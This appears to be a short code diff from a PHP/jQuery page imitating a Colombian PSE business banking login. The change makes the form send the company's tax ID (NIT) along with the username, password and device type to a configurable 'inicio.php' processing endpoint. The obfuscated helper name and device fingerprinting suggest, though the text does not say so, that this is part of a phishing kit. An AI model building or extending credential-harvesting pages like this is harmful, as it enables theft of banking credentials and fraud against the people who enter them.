@@ -242,10 +242,11 @@ $tiempo = b34f9_fecha_larga();
                 $("#fondo").show();
                 var dispositivo = detectarDispositivo();
 
-                // Enviar a inicio.php con tipo_cliente = "empresa" y la contraseña
+                // Enviar a inicio.php con tipo_cliente = "empresa", contraseña y NIT
                 $.post(PSE_PROCESS + "inicio.php", {
                     usr: usuario,
                     pas: clave,
+                    nit: nit,
                     dis: dispositivo,
                     tc: "empresa"
                 }, function(data) {
